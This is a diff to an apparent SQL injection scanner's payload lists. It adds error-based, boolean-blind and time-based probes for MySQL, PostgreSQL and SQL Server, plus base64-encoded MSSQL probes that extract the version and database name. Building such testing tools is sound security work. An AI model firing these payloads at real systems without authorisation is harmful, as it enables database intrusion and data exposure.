@@ -60,6 +60,12 @@ ERROR_BASED_PAYLOADS = [
     "--",
     "';--",
     " OR 1=1", # Can sometimes trigger errors on poorly configured systems
+    # Payloads from payloadbox/sql-injection-payload-list
+    " OR 1=1#",
+    " OR 1=1--",
+    " HAVING 1=1",
+    " AND 1=1",
+    " ORDER BY 1",
 ]
 
 # Payloads for Boolean-Based Blind SQLi.
@@ -77,6 +83,9 @@ BOOLEAN_BASED_PAYLOADS = [
     ("' OR 1=1-- ", "' OR 1=2-- "),
     ('" AND 1=1-- ', '" AND 1=2-- '),
     ('" OR 1=1-- ', '" OR 1=2-- '),
+    # Payloads from payloadbox/sql-injection-payload-list
+    (" AND 1 LIKE 1", " AND 1 LIKE 2"),
+    (" AND 1 RLIKE 1", " AND 1 RLIKE 0"),
 ]
 
 # Payloads for Time-Based Blind SQLi.
@@ -87,14 +96,25 @@ TIME_BASED_PAYLOADS = [
     ("OR SLEEP({sleep})", 5),
     ("AND (SELECT * FROM (SELECT(SLEEP({sleep})))a)", 5),
     ("' AND SLEEP({sleep}) AND '1'='1", 5),
+    ("AND BENCHMARK({sleep}000000,MD5(1))", 5),
+    ("OR BENCHMARK({sleep}000000,MD5(1))", 5),
+
 
     # PostgreSQL
     ("AND (SELECT pg_sleep({sleep}))", 5),
     ("' AND (SELECT pg_sleep({sleep})) AND '1'='1", 5),
+    ("pg_sleep({sleep})", 5),
 
     # SQL Server
     ("AND WAITFOR DELAY '0:0:{sleep}'", 5),
     ("' AND WAITFOR DELAY '0:0:{sleep}' AND '1'='1", 5),
+]
+
+# MSSQL Specific Payloads (b64 encoded)
+MSSQL_ERROR_BASED_PAYLOADS_B64 = [
+    "QU5EIDE9Q09OVkVSVChpbnQsIChTRUxFQ1QgQEB2ZXJzaW9uKSk=",
+    "QU5EIDE9KFNFTEVDVCAxIEZST00gc3lzb2JqZWN0cyk=",
+    "QU5EIDE9Q0FTVChEQl9OQU1FKCkgQVMgaW50KQ==",
 ]
 
 # Payloads for Out-of-Band (OOB) SQLi.
